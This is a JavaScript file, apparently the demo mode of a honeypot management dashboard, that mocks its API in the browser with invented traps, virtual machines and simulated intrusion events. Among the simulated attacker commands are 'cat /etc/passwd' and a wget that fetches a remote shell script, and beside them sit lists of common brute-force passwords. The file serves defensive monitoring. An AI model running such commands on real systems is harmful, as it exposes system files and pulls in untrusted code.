// Демо-режим (VITE_DEMO=1): мини-«центр» в памяти браузера вместо /api. Данные вымышленные, ничего не сохраняется.
export const DEMO = import.meta.env.VITE_DEMO === '1'

const ago = (s) => new Date(Date.now() - s * 1000).toISOString()
const svc = (port, banner) => ({ port, proto: 'banner', banner })
const mkProfile = (id, name, description, services, level = 'low') => ({
  id, name, description, level, services,
  decoys: {
    hostname: 'srv-01', accept_any_password: true,
    users: [{ username: 'root', password: 'Winter2024!' }, { username: 'admin', password: 'admin123' }],
    honeytokens: [{ type: 'file', path: '/root/.aws/credentials', content: 'AKIA…DEMO' }],
  },
  logging: {}, masking: { beacon_interval: 15, jitter: 0.3 },
})

const db = {
  nextProfile: 10, nextTrap: 10, nextVmid: 120, nextEvent: 1,
  profiles: [
    mkProfile(1, 'ssh-banner-low', 'SSH-сканер: отдаёт баннер OpenSSH', [svc(22, 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3\r\n')]),
    mkProfile(2, 'ftp-low', 'FTP-сервер с баннером vsftpd', [svc(21, '220 (vsFTPd 3.0.3)\r\n')]),
    mkProfile(3, 'mysql-low', 'MySQL-баннер', [svc(3306, '5.7.42-0ubuntu0.18.04.1')]),
    mkProfile(4, 'fake-ssh-medium', 'Поддельный SSH с оболочкой', [{ port: 2222, proto: 'ssh', banner: '' }], 'medium'),
  ],
  machines: [
    { vmid: 101, name: 'dmz-ssh', type: 'lxc', node: 'pve1', bridge: 'vmbr1', ip: '10.20.0.11', status: 'running', job: null, agent: 'online', last_seen: ago(5), cores: 1, memory_mb: 1024, disk_gb: 8 },
    { vmid: 102, name: 'dmz-db', type: 'kvm', node: 'pve1', bridge: 'vmbr1', ip: '10.20.0.12', status: 'running', job: null, agent: 'offline', last_seen: ago(900), cores: 2, memory_mb: 2048, disk_gb: 20 },
    { vmid: 103, name: 'spare', type: 'lxc', node: 'pve1', bridge: 'vmbr1', ip: '', status: 'stopped', job: null, agent: 'never', last_seen: null, cores: 1, memory_mb: 512, disk_gb: 4 },
  ],
  traps: [
    { id: 1, name: 'ssh-bait', profile_id: 1, machine_vmid: 101, enabled: true, status: 'online', events: 0, last_seen: ago(5) },
    { id: 2, name: 'ftp-bait', profile_id: 2, machine_vmid: 101, enabled: true, status: 'online', events: 0, last_seen: ago(40) },
    { id: 3, name: 'mysql-bait', profile_id: 3, machine_vmid: 102, enabled: true, status: 'offline', events: 0, last_seen: ago(900) },
  ],
  events: [],
}

const IPS = ['185.220.101.4', '45.155.205.233', '91.240.118.172', '103.145.12.9', '194.26.29.113']
const USERS = ['root', 'admin', 'ubuntu', 'test', 'oracle', 'postgres']
const PASSES = ['123456', 'admin', 'password', 'root', 'qwerty', 'Winter2024!']
const CMDS = ['uname -a', 'cat /etc/passwd', 'wget http://203.0.113.7/x.sh', 'id', 'ls -la /root']
const pick = (a) => a[Math.floor(Math.random() * a.length)]

export function demoEvent(ageSec = 0) {
  const t = pick(db.traps.filter((x) => x.status === 'online'))
  const type = pick(['connect', 'auth_attempt', 'auth_attempt', 'auth_attempt', 'command', 'honeytoken'])
  const ev = { id: db.nextEvent++, ts: ago(ageSec), type, trap_id: t.id, trap: t.name, src_ip: pick(IPS), src_port: 40000 + Math.floor(Math.random() * 20000) }
  if (type === 'auth_attempt') Object.assign(ev, { username: pick(USERS), password: pick(PASSES) })
  if (type === 'command') ev.command = pick(CMDS)
  if (type === 'honeytoken') ev.message = 'Прочитан /root/.aws/credentials'
  t.events++
  return ev
}
for (let i = 0; i < 60; i++) db.events.push(demoEvent(i * 47))
db.events.reverse()

const top = (key) => {
  const m = {}
  db.events.forEach((e) => e[key] && (m[e[key]] = (m[e[key]] || 0) + 1))
  return Object.entries(m).sort((a, b) => b[1] - a[1]).slice(0, 8).map(([value, count]) => ({ value, count }))
}
const trapOut = (t) => {
  const p = db.profiles.find((x) => x.id === t.profile_id)
  const m = db.machines.find((x) => x.vmid === t.machine_vmid)
  return { ...t, profile: p ? p.name : '', level: p ? p.level : '', host: m ? m.ip : '', agent_version: '0.1-demo' }
}
const fail = (detail) => new Error(detail)

export async function demoApi(path, method, body) {
  await new Promise((r) => setTimeout(r, 120))
  const url = new URL(path, 'http://demo')
  const seg = url.pathname.replace(/^\/api\//, '').split('/')
  const id = Number(seg[1])
  const [res] = seg

  if (res === 'auth') return { username: 'demo', role: 'admin', csrf: 'demo', next: '2fa' }
  if (res === 'profiles') {
    if (method === 'GET') return db.profiles
    if (method === 'POST') {
      const p = { ...body, id: db.nextProfile++ }
      db.profiles.push(p)
      return p
    }
    const i = db.profiles.findIndex((p) => p.id === id)
    if (method === 'PUT') {
      db.profiles[i] = { ...body, id }
      return db.profiles[i]
    }
    if (db.traps.some((t) => t.profile_id === id)) throw fail('Профиль используется ловушками')
    db.profiles.splice(i, 1)
    return null
  }
  if (res === 'traps') {
    if (method === 'GET') return db.traps.map(trapOut)
    if (method === 'POST' && seg[2] === 'deploy') {
      return { kind: 'script', token: 'demo-token', artifact: '#!/bin/sh\n# ДЕМО: агент не подключается\necho "honeyforge-agent demo"\n' }
    }
    if (method === 'POST') {
      const t = { id: db.nextTrap++, enabled: true, status: 'waiting', events: 0, last_seen: null, ...body }
      db.traps.push(t)
      return trapOut(t)
    }
    const t = db.traps.find((x) => x.id === id)
    if (method === 'PATCH') {
      Object.assign(t, body)
      return trapOut(t)
    }
    db.traps = db.traps.filter((x) => x.id !== id)
    return null
  }
  if (res === 'machines') {
    if (method === 'GET') return db.machines
    if (method === 'POST') {
      const m = {
        vmid: db.nextVmid++, name: body.name, type: body.type, node: 'pve1', bridge: 'vmbr1', ip: '10.20.0.' + (20 + (db.nextVmid % 200)),
        status: 'running', job: null, agent: 'waiting', last_seen: null, cores: body.cores, memory_mb: body.memory_gb * 1024, disk_gb: body.disk_gb,
      }
      db.machines.push(m)
      return m
    }
    const m = db.machines.find((x) => x.vmid === id)
    if (method === 'DELETE') {
      db.machines = db.machines.filter((x) => x !== m)
      db.traps = db.traps.filter((t) => t.machine_vmid !== id)
      return null
    }
    if (method === 'PUT') {
      Object.assign(m, body, body.memory_gb ? { memory_mb: body.memory_gb * 1024 } : {})
      return m
    }
    if (seg[2] === 'start') Object.assign(m, { status: 'running', agent: 'online', last_seen: ago(0) })
    if (seg[2] === 'shutdown') Object.assign(m, { status: 'stopped', agent: 'offline' })
    return { ok: true }
  }
  if (res === 'stats') {
    const byType = {}
    db.events.forEach((e) => (byType[e.type] = (byType[e.type] || 0) + 1))
    const timeline = Array.from({ length: 24 }, (_, i) => ({
      t: String(i).padStart(2, '0') + ':00',
      n: db.events.filter((e) => Math.floor((Date.now() - Date.parse(e.ts)) / 3600000) === 23 - i).length,
    }))
    const by_hour = timeline.map((x) => ({ t: x.t, n: x.n, auth: Math.floor(x.n / 2), alert: x.n > 3 ? 1 : 0 }))
    return { total_24h: db.events.length, by_type: byType, by_hour, top_countries: [{ value: 'Germany', count: 7 }, { value: 'China', count: 4 }], top_asn: [{ value: 'AS24940', count: 6 }], top_sources: top('src_ip'), top_usernames: top('username'), top_passwords: top('password'), timeline }
  }
  if (res === 'events') return { items: db.events.slice(0, 200), next_before_id: null }
  throw fail('Демо: не поддерживается ' + path)
}
